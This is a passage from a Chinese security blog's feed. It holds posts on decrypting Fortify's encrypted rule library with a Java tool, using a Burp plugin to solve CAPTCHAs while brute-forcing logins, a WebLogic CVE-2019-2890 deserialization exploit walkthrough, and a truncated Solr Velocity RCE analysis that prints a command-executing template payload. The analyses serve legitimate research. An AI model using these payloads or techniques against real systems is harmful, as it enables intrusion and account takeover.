byteBuf = t;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            byteBufDelay = byteBuf;</span><br><span class="line">            byteBuf = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">8</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此我们确定decryptCompressed()可以解密解压一个文件，至于是否可以是规则库文件，我们可以写如下代码来测试。</p><p><img src="/articles/2019/fortify-rule-library-decryption-process/117337DD-962F-4B64-90AF-AC4C98D92F47.png" alt="decryptCompressed()方法可以完美解密规则库文件"></p><p>发现解密结果是有意义的xml文件内容，完美解密！</p><h2 id="0x04-编写解密程序"><a href="#0x04-编写解密程序" class="headerlink" title="0x04 编写解密程序"></a>0x04 编写解密程序</h2><p>理清整个过程后，解密就很简单了。说白了就是批量调用fortify自带的<code>fortify-crypto-1.0.jar</code>中的<code>com.fortify.util.CryptoUtil.decryptCompressed()</code>方法进行解密。最后附上解密程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> <span class="keyword">static</span> com.fortify.util.CryptoUtil.decryptCompressed;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FortifyRuleDecrypter</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String ruleDir;</span><br><span class="line">    <span class="keyword">private</span> String saveDir;</span><br><span class="line"></span><br><span class="line">    FortifyRuleDecrypter(String ruleDir,String saveDir)&#123;</span><br><span class="line">        <span class="keyword">this</span>.ruleDir = ruleDir;</span><br><span class="line">        <span class="keyword">this</span>.saveDir = saveDir;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">doDecrypt</span><span class="params">()</span></span>&#123;</span><br><span class="line">        File encryptRule = <span class="keyword">new</span> File(ruleDir);</span><br><span class="line">        <span class="comment">// 传入的是文件</span></span><br><span class="line">        <span class="keyword">if</span>(encryptRule.isFile()) &#123;</span><br><span class="line">            <span class="keyword">if</span>(encryptRule.getName().endsWith(<span class="string">".bin"</span>)) &#123;</span><br><span class="line">                decryptRule(encryptRule, <span class="keyword">new</span> File(saveDir + File.separator + encryptRule.getName() + <span class="string">".xml"</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">"[-] The rule file suffix is.bin!"</span>);</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//传入是目录</span></span><br><span class="line">        <span class="keyword">if</span> (encryptRule.isDirectory()) &#123;</span><br><span class="line">            File[] listFile = encryptRule.listFiles();</span><br><span class="line">            <span class="keyword">for</span>(File file:listFile)&#123;</span><br><span class="line">                <span class="keyword">if</span>(file.getName().endsWith(<span class="string">".bin"</span>))&#123;</span><br><span class="line">                    File saveName = <span class="keyword">new</span> File(saveDir + File.separator + file.getName().replace(<span class="string">".bin"</span>,<span class="string">""</span>) + <span class="string">".xml"</span>);</span><br><span class="line">                    decryptRule(file,saveName);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span>  <span class="keyword">void</span> <span class="title">decryptRule</span><span class="params">(File encFile, File decFile)</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//调用decryptCompressed()对规则库进行解密</span></span><br><span class="line">            InputStream ruleStream = decryptCompressed(<span class="keyword">new</span> FileInputStream(encFile), <span class="keyword">null</span>);</span><br><span class="line">            OutputStream outputStream = <span class="keyword">new</span> FileOutputStream(decFile);</span><br><span class="line">            <span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">1024</span>];</span><br><span class="line">            <span class="keyword">while</span> ((ruleStream.read(b)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                outputStream.write(b);</span><br><span class="line">            &#125;</span><br><span class="line">            ruleStream.close();</span><br><span class="line">            outputStream.close();</span><br><span class="line">            System.out.println(String.format(<span class="string">"[+] success %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            System.out.println(String.format(<span class="string">"[-] fail %s -&gt; %s"</span>,encFile.getName(),decFile.getAbsolutePath()));</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(args.length != <span class="number">2</span>)&#123;</span><br><span class="line">            System.out.println(<span class="string">"Usage: java -jar FortifyRuleDecrypter.jar [rule_dir|rule_file] &lt;save_dir&gt;"</span>);</span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        FortifyRuleDecrypter decrypter = <span class="keyword">new</span> FortifyRuleDecrypter(args[<span class="number">0</span>],args[<span class="number">1</span>]);</span><br><span class="line">        decrypter.doDecrypt();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/articles/2019/fortify-rule-library-decryption-process/726FEDA7-ABD4-4EED-9431-B87C034A5F5C.png" alt="解密效果"></p><h2 id="0x05-最后的话"><a href="#0x05-最后的话" class="headerlink" title="0x05 最后的话"></a>0x05 最后的话</h2><p>最终为了快速解决问题，通过编码调用锁定解密方法，确实有运气的成分。​最终虽然解决了问题，但依然存在如下疑问，只能等有空再研究。先赶时间去朋友那撸猫包饺子去了！</p><ol><li>fortify在扫描时没有调用解密方法，难道是加密的规则库可以直接用于扫描？</li><li>如果扫描无需解密规则库，那为何fortify又要在jar中提供解密方法？</li><li>到底解密方法在哪里被调用？</li></ol><p><img src="/articles/2019/fortify-rule-library-decryption-process/dumplings-and-cat.jpeg" alt="冬至的夜晚"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;前段时间在学习fortify的规则编写，想充分利用其污点回溯功能来扫描出当下比较新的漏洞，比如fastjson反序列化漏洞。网上有比较好的资料是《fortify安全代码规则编写指南》，但是很缺例子。于是想参考下官方的规则库，但是是加密的，万般无奈只能踏上解密之旅。&lt;/p&gt;

      
    
    </summary>
    
      <category term="逆向破解" scheme="http://gv7.me/categories/%E9%80%86%E5%90%91%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="fortify" scheme="http://gv7.me/tags/fortify/"/>
    
  </entry>
  
  <entry>
    <title>使用burp插件captcha-killer识别图片验证码</title>
    <link href="http://gv7.me/articles/2019/burp-captcha-killer-usage/"/>
    <id>http://gv7.me/articles/2019/burp-captcha-killer-usage/</id>
    <published>2019-12-16T17:30:18.000Z</published>
    <updated>2019-12-16T18:37:31.053Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-开发背景"><a href="#0x01-开发背景" class="headerlink" title="0x01 开发背景"></a>0x01 开发背景</h2><p>说起对存在验证码的登录表单进行爆破，大部分人都会想到<code>PKav HTTP Fuzzer</code>，这款工具在前些年确实给我们带来了不少便利。反观burp一直没有一个高度自定义通杀大部分图片验证码的识别方案，于是抽了点闲暇的时间开发了<a href="https://github.com/c0ny1/captcha-killer" target="_blank" rel="noopener">captcha-kille</a>，希望burp也能用上各种好用的识别码技术。其设计理念是<code>只专注做好对各种验证码识别技术接口的调用！</code>说具体点就是burp通过同一个插件，就可以适配各种验证码识别接口，无需重复编写调用代码。今天不谈编码层面如何设计，感兴趣的可以去github看源码。此处只通过使用步骤来说明设计的细节。</p><h2 id="0x02-Step1-将获取验证码的数据包发送到插件"><a href="#0x02-Step1-将获取验证码的数据包发送到插件" class="headerlink" title="0x02 Step1:将获取验证码的数据包发送到插件"></a>0x02 Step1:将获取验证码的数据包发送到插件</h2><p>使用burp抓取获取验证码数据包，然后右键<code>captcha-killer</code> -&gt; <code>send to captcha panel</code>发送数据包到插件的验证码请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-1.png" alt="将请求验证码数据包发送到插件"></p><p>然后到切换到插件面板，点击获取即可拿到要识别的验证码图片内容。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step1-2.png" alt="请求获取验证码"></p><p><strong>注意：获取验证码的cookie一定要和intruder发送的cookie相同！</strong></p><h2 id="0x03-Step2-配置识别接口的地址和请求包"><a href="#0x03-Step2-配置识别接口的地址和请求包" class="headerlink" title="0x03 Step2:配置识别接口的地址和请求包"></a>0x03 Step2:配置识别接口的地址和请求包</h2><p>拿到验证码之后，就要设置接口来进行识别了。我们可以使用网上寻找免费的接口，用burp抓包，然后右键发送到插件的接口请求面板。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-1.png" alt="将接口调用请求发送到插件"></p><p>然后我们把图片内容的位置用标签来代替。比如该例子使用的接口是post提交image参数，参数的值为图片二进制数据的base64编码后的url编码。那么<code>Request template</code>(请求模版)面板应该填写如下：</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-2.png" alt="接口请求模版设置"></p><table><thead><tr><th align="center">ID</th><th align="left">标签</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left"><code>&lt;@IMG_RAW&gt;&lt;/@IMG_RAW&gt;</code></td><td align="left">代表验证码图片原二进制内容</td></tr><tr><td align="center">2</td><td align="left"><code>&lt;@URLENCODE&gt;&lt;/@URLENCODE&gt;</code></td><td align="left">对标签内的内容进行url编码</td></tr><tr><td align="center">3</td><td align="left"><code>&lt;@BASE64&gt;&lt;/@BASE64&gt;</code></td><td align="left">对标签内的内容进行base64编码</td></tr></tbody></table><p>最后点击“识别”即可获取到接口返回的数据包，同时在<code>request raw</code>可以看到调用接口最终发送的请求包。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step2-3.png" alt="模版被渲染为最终的请求"></p><h2 id="0x03-Step3-设置用于匹配识别结果的规则"><a href="#0x03-Step3-设置用于匹配识别结果的规则" class="headerlink" title="0x03 Step3:设置用于匹配识别结果的规则"></a>0x03 Step3:设置用于匹配识别结果的规则</h2><p>通过上一步我们获取到了识别接口的返回结果，但是插件并不知道返回结果中，哪里是真正的识别结果。插件提供了4中方式进行匹配，可以根据具体情况选择合适的。</p><table><thead><tr><th align="center">ID</th><th align="left">规则类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="center">1</td><td align="left">Repose data</td><td align="left">这种规则用于匹配接口返回包内容直接是识别结果</td></tr><tr><td align="center">2</td><td align="left">Regular expression</td><td align="left">正则表达式,适合比较复杂的匹配。比如接口返回包<code>{&quot;coede&quot;:1,&quot;result&quot;:&quot;abcd&quot;}</code>说明abcd是识别结果，我们可以编写规则为<code>result&quot;:&quot;(.*?)&quot;\}</code></td></tr><tr><td align="center">3</td><td align="left">Define the start and end positions</td><td align="left">定义开始和结束位置,使用上面的例子，可以编写规则<code>{&quot;start&quot;:21,&quot;end&quot;:25}</code></td></tr><tr><td align="center">4</td><td align="left">Defines the start and end strings</td><td align="left">定义开始和结束字符，使用上面的例子，可以编写规则为<code>{&quot;start&quot;:&quot;result\&quot;:\&quot;,&quot;end&quot;:&quot;\&quot;\}&quot;}</code></td></tr></tbody></table><p>通过分析我们知道，接口返回的json数据中，字段<code>words</code>的值为识别结果。我们这里使用<code>Regular expression</code>(正则表达式)来匹配，然后选择<code>yzep</code>右键<code>标记为识别结果</code>，系统会自动生成正则表达式规则<code>&quot; (.*?)&quot;\}\]</code>。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-1.png" alt="设置匹配方式和自动生成规则"></p><p>注意：若右键标记自动生成的规则匹配不精确，可以人工进行微调。比如该例子中可以微调规则为<code>&quot;words&quot;\: &quot;(.*?)&quot;\}</code>将更加准确！</p><p>到达这步建议将配置好常用接口的url，数据包已经匹配规则保存为模版，方便下次直接通过右键<code>模板库</code>中快速设置。同时插件也有默认的模版供大家使用与修改。</p><p><img src="/articles/2019/burp-captcha-killer-usage/step3-2.png" alt="保存设置好的配置，方便下次快速配置"></p><h2 id="0x04-Step4-在Intruder模块调用"><a href="#0x04-Step4-在Intruder模块调用" class="headerlink" title="0x04 Step4:在Intruder模块调用"></a>0x04 Step4:在Intruder模块调用</h2><p>配置好各项后，可以点击<code>锁定</code>对当前配置进行锁定，防止被修改导致爆破失败！接着安装以下步骤进行配置</p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-1.png" alt="设置Intruder的爆破模式和payload位置"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-2.png" alt="验证码payload选择有插件来生成"></p><p><img src="/articles/2019/burp-captcha-killer-usage/step4-3.png" alt="进行爆破，可以通过对比识别结果看出识别率"></p><h2 id="0x05-使用小案例"><a href="#0x05-使用小案例" class="headerlink" title="0x05 使用小案例"></a>0x05 使用小案例</h2><p>后续将通过小案例来演示，如何通过captcha-killer让burp使用上各种技术识别验证码(免费方案)，敬请期待！</p><ul><li>《captcha-killer调用tesseract-ocr识别验证码》[待发布]</li><li>《captcha-killer调用完美识别验证码系统》[待发布]</li><li>《captcha-killer调用百度ocr识别验证码》[待发布]</li><li>《capatch-killer+机器学习识别验证码》[待发布]</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-开发背景&quot;&gt;&lt;a href=&quot;#0x01-开发背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 开发背景&quot;&gt;&lt;/a&gt;0x01 开发背景&lt;/h2&gt;&lt;p&gt;说起对存在验证码的登录表单进行爆破，大部分人都会想到&lt;code&gt;PKav HTTP 
      
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="burp" scheme="http://gv7.me/tags/burp/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic t3反序列化漏洞(CVE-2019-2890)分析</title>
    <link href="http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/"/>
    <id>http://gv7.me/articles/2019/cve-2019-2890-vulnerability-analysis/</id>
    <published>2019-11-04T14:04:07.000Z</published>
    <updated>2019-11-05T02:13:00.189Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLab提交的CVE-2019-2890的修复。该漏洞通过T3协议发送恶意的反序列化数据绕过了Weblogic的黑名单，成功反序列化执行任意命令。通过官方公告可知，该漏洞的利用条件是需要认证。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/965305D2-2F45-4575-9A16-18A076A01A08.png" alt="官方公告"></p><h2 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a>0x02 影响范围</h2><ul><li>Weblogic 10.3.6.0.0</li><li>Weblogic 12.1.3.0.0</li><li>Weblogic 12.2.1.3.0</li></ul><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面以10.3.6.0作为分析版本。问题出现在<code>PersistentContext</code>类上，通过查看继承关系我们知道<code>PersistentContext</code>类实现了序列化接口<code>Serializable</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E9257EC7-5283-4A10-B5A3-48768E40879D.png" alt="PersistentContext类继承关系"></p><p>我们来看看它的<code>readObject</code>方法，将<code>ObjectInputStream</code>类对象<code>var1</code>传入<code>readSubject</code>方法。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E970A5E7-E834-400C-9984-5C3507948B64.png" alt="readObject方法"></p><p>跟进<code>readSubject</code>方法发现，会先从<code>var1</code>中读取反序列化数据当中的对象数据。然后调用<code>EncryptionUtil.decrypt</code>方法进行解密，最后解密后的数据被用于反序列化为对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B61188D2-9A6F-4DAC-892B-C1144A88D230.png" alt="readSubject方法"></p><p>至此我们知道<code>PersistenContext</code>序列化数据中还携带了其他对象反序列化后的加密数据。如果我们在序列化<code>PersistentContext</code>时，将恶意对象反序列化数据先加密，然后<code>writeObject</code>，就可以让其携带恶意对象，绕过Weblogic黑名单进行反序列化了。</p><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>根据以上思路，我们编写一个携带恶意对象的<code>PersistenContext</code>类。只需修改下原来代码中的<code>writeSubject</code>方法为如下，其中<code>Poc.getObject()</code>就是我们的恶意对象。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/5FB1320C-A1C4-43F0-96C5-7D21EE70E199.png" alt="修改writeSubject方法代码"></p><p>在<strong>进行序列化之前我们要处理四个问题</strong>。<strong>第一个问题是创建PersistenContext对象报错</strong>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/57A3655A-F776-49C2-BAA7-0F9F03198140.png" alt="创建PersistenContext对象报错信息"></p><p>这是因为<code>PersistenContext</code>初始化时调用了<code>SecurityServiceManager.isKernelIdentity()</code>进行内核身份判断。<code>isKernelIdentity</code>方法无论如何都会抛出一个<code>NotSupportedException</code>异常，导致我们序列化被终止。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/E816991E-9EA3-468E-85FA-1C9175314834.png" alt="SecurityServiceManager.isKernelIdentity()方法"></p><p>我们可以将其注释掉</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/3E6D0521-8AB3-45E2-B02D-803BBF515919.png" alt="PersistenContext构造方法要修改的代码"></p><p><strong>第二个问题是反序列化PersistenContext类会出现卡死现象</strong>。这是因为<code>PersistenContext</code>等相关的类都会有一个<code>AuthenticatedSubject</code>静态对象要初始化。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/A505C25E-EDF1-412B-8EDE-C7ABE8765F83.png" alt="静态AuthenticatedSubject内核id对象"></p><p>初始化时会进入到如下代码。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/F4F81B39-2D22-4F10-84C2-FF533AB55003.png" alt="导致卡死的代码段"></p><p>我们需要<code>ceClient</code>变量为<code>true</code>，否则会一直进循环执行<code>ceSubjectManagerLock.wait()</code>进行等待，无法序列化！而<code>ceClient</code>是从系统属性<code>com.bea.core.internal.client</code>获取的，所以在序列化之前需要将该属性设置为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/89C83A3D-8F6F-4C4E-890B-9090929D60F9.png" alt="ceClient变量的赋值"></p><p><strong>第三个问题是恶意对象没有被加密</strong>。这是因为在调用<code>EncryptionUtil.encrypt</code>方法加密时，会根据<code>Kernel.isServer()</code>为<code>true</code>时才会进行加密，否则返回原数据。<br>因此加密之前需要调用<code>KernelStatus.setIsServer(true)</code>设置状态为<code>true</code>。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/00CBD49C-24DD-45CB-8B96-5C96F59D2543.png" alt="加密时的判断"></p><p><strong>第四个问题，加密时需要<code>SerializedSystemIni.dat</code>文件。</strong> 我们需要目标服务器weblogic当前使用域下该文件放到我们poc的根目录。这也是官方将这个漏洞划分为需要认证的原因。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/0E16C9FC-DF1D-4162-8551-A99F81CDB316.png" alt="加密时需要SerializedSystemIni.dat文件"></p><p>解决完这四个问题，就可以将<code>PersistenContext</code>对象反序列化为文件了。最后通过t3协议发送反序列化数据给Weblogic，即可执行任意命令。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/B861234A-24EA-49C9-BAD8-B2E0749EF2E3.png" alt="序列化PersistenContext对象为文件"><br><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/364E764C-5247-4FB5-9225-DDD9290E9660.png" alt="漏洞利用演示"></p><h2 id="0x05-补丁分析"><a href="#0x05-补丁分析" class="headerlink" title="0x05 补丁分析"></a>0x05 补丁分析</h2><p>通过对比，发现最新补丁在反序列化时，使用<code>WSFilteringObjectInputStream</code>对要反序列化的对象进行过滤。</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/751120F6-1CBF-46CE-B226-A4B45C1D29F1.png" alt="补丁修复处"></p><p><code>WSFilteringObjectInputStream</code>实现了Weblogic下的过滤接口 <code>FilteringObjectInputStream</code>。在其<code>resolveClass</code>方法中，检查要反序列化的类是不是<code>Subject</code>的子类，不是则会抛出一个非法类异常，反序列化终止！</p><p><img src="/articles/2019/cve-2019-2890-vulnerability-analysis/597CFF7E-38BA-4A02-B977-53D5B3DE5282.png" alt="补丁修复的方式"></p><h2 id="0x06-分析总结"><a href="#0x06-分析总结" class="headerlink" title="0x06 分析总结"></a>0x06 分析总结</h2><p>这个漏洞需要满足以下两个条件，才能触发成功,较为鸡肋。</p><ol><li>Weblogic开启t3协议</li><li>可以获取到<code>SerializedSystemIni.dat</code>文件</li></ol><p>但是在实际环境中，如果部署在weblogic的站点存在<code>任意文件下载</code>或者<code>任意文件读取</code>，那么配合上该漏洞即可执行任意命令。</p><h2 id="0x07-参考文章"><a href="#0x07-参考文章" class="headerlink" title="0x07 参考文章"></a>0x07 参考文章</h2><ul><li><a href="https://www.oracle.com/security-alerts/cpuoct2019.html" target="_blank" rel="noopener">Oracle Critical Patch Update Advisory - October 2019</a></li><li><a href="https://mp.weixin.qq.com/s/BW1d_NTsmXoSoOYAt8T2RQ" target="_blank" rel="noopener">WebLogic 反序列化漏洞(CVE-2019-2890)分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-漏洞背景&quot;&gt;&lt;a href=&quot;#0x01-漏洞背景&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞背景&quot;&gt;&lt;/a&gt;0x01 漏洞背景&lt;/h2&gt;&lt;p&gt;在WebLogic官方发布的10月份安全补丁中，包含了由Venustech ADLa
      
    
    </summary>
    
      <category term="漏洞分析" scheme="http://gv7.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
      <category term="weblogic" scheme="http://gv7.me/tags/weblogic/"/>
    
  </entry>
  
  <entry>
    <title>Apache solr Velocity模版远程命令执行漏洞分析</title>
    <link href="http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/"/>
    <id>http://gv7.me/articles/2019/apache-solr-velocity-rce-20191031/</id>
    <published>2019-10-31T14:00:00.000Z</published>
    <updated>2019-11-01T07:10:28.332Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-漏洞背景"><a href="#0x01-漏洞背景" class="headerlink" title="0x01 漏洞背景"></a>0x01 漏洞背景</h2><p>2019年10月31日，一个Solr Velocity模板远程命令执行的POC被公开到Github。经过分析测试，该POC在Solr的多个版本测试成功，包含最新版本，所以该漏洞目前处于0day状态。由于Solr默认未开启登录认证，只需请求<code>/节点名/config</code>,将配置项<code>params.resource.loader.enabled</code>设置为<code>true</code>，再构造链接即可让Solr中的<code>Velocity</code>模版引擎渲染传入的<code>恶意模版</code>，造成命令执行。下面我们来具体分析漏洞细节！</p><h2 id="0x02-知识储备"><a href="#0x02-知识储备" class="headerlink" title="0x02 知识储备"></a>0x02 知识储备</h2><p><code>Velocity</code>是一个基于Java的模板引擎，简单来说就是可以将模版渲染成html页面。下面以一个小demo来演示使用<code>Velocity</code>如何渲染出<code>test by chixiao lab</code>,方便大家快速理解<code>Velocity</code>的功能和使用。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/86DBE94C-81E6-4CE9-AD4F-084638F2106C.png" alt="一个使用Velocity来渲染模版的小Demo"></p><p>如果我们的模版<code>test.vm</code>内容改如下时，那么<code>Velocity</code>将会执行<code>id</code>命令，并显示执行结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#set($x=&apos;&apos;)</span><br><span class="line">#set($rt=$x.class.forName(&apos;java.lang.Runtime&apos;))</span><br><span class="line">#set($chr=$x.class.forName(&apos;java.lang.Character&apos;))</span><br><span class="line">#set($str=$x.class.forName(&apos;java.lang.String&apos;))</span><br><span class="line">#set($ex=$rt.getRuntime().exec(&apos;id&apos;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out=$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">    $str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br></pre></td></tr></table></figure><p>所以某个应用以<code>Velocity</code>作为模版渲染引擎，如果要渲染的模版内容用户可控的话，那就可以构造恶意模版来执行任意命令。本次Solr漏洞就是这种情况！</p><h2 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h2><p>下面我们在<code>Solr 8.2.0</code>上以公开的POC触发的漏洞链进行分析。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1F69B8C0-F828-494C-8166-D7AFD4AE613E.png" alt="公开的POC"></p><p>Solr在查询数据结束后，会通过<code>wt</code>参数的值来确定数据返回的格式，可以是<code>XML</code>、<code>JSON</code>、<code>CSV</code>,<code>Velocity模版渲染</code>等等。本次漏洞正是出现在查询结果用<code>Velocity模版渲染</code>。</p><p>从代码层面看，Solr会根据<code>wt</code>值，创建对应的类型的<code>QueryResponseWriter</code>来将查询数据处理成对应的格式，最后将数据<code>write()</code>到客户端。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/FE4E7C2B-87CA-4721-BBA2-945B06B92689.png" alt="根据wt确定对应的数据处理对象"></p><p>由于我们这里设置的是<code>wt=velocity</code>,故<code>QueryResponseWriter</code>类型为<code>VelocityResponseWriter</code>。我们在<code>solr-velocity-8.2.0.jar</code>包的<code>VelocityResponseWriter.write()</code>方法打断点，作为漏洞分析的开始位置。</p><p>首先Solr会先创建一个Velocity模版引擎对象<code>engine</code>，跟进<code>createEngine()</code>方法。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/1381E002-323E-4299-9A8B-F1E6A1A03F8E.png" alt="创建解析引擎对象"></p><p>发现当设置<code>&quot;params.resource.loader.enabled&quot;: &quot;true&quot;</code>时，属性<code>this.paramsResourceLoaderEnabled</code>的值为<code>true</code>，程序将创建一个参数资源加载器对象，也就是模版内容将从前端传来的参数中加载（PS:知识储备的案例是从文件加载）。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8C442324-CF12-45EB-9FAE-E6BC63505BB8.png" alt="创建参数资源加载器"></p><p>继续跟进<code>SolrParamResourceLoader</code>类的构造方法，解析了前端传来的所有参数，并对<code>v.template.</code>开头的参数进行处理。我们请求的参数为<code>...&amp;v.template=custom&amp;v.template.custom=恶意模版内容</code>,所以<code>put</code>进入<code>templates</code>模版<code>map</code>的<code>key</code>是<code>custom.vm</code>,<code>value</code>就是我们指定的<code>恶意模版内容</code>。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/8D6900E0-292A-4D8E-B682-99B2D9B92608.png" alt="将前端传入的恶意模版保存为custom.vm"></p><p>之后在获取模版对象时,将前端传入的参数<code>v.template</code>值拼接<code>.vm</code>，也就<code>custom.vm</code>，作为要渲染的模版名。而<code>custom.vm</code>正是我们上一步传入的恶意模版。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CD9FDCEB-B8AE-4659-8D92-08BFAA7F8896.png" alt="使用custom.vm创建模版对象"></p><p>然后我们重新回到<code>write()</code>方法，不管<code>wrapResponse</code>变量为<code>true</code>还是<code>false</code>，恶意模版都被传入<code>merge()</code>进行合并渲染，至此漏洞触发。</p><p><img src="/articles/2019/apache-solr-velocity-rce-20191031/CA7EFD0E-CAB8-437E-BDE4-0C683CEE5452.png" 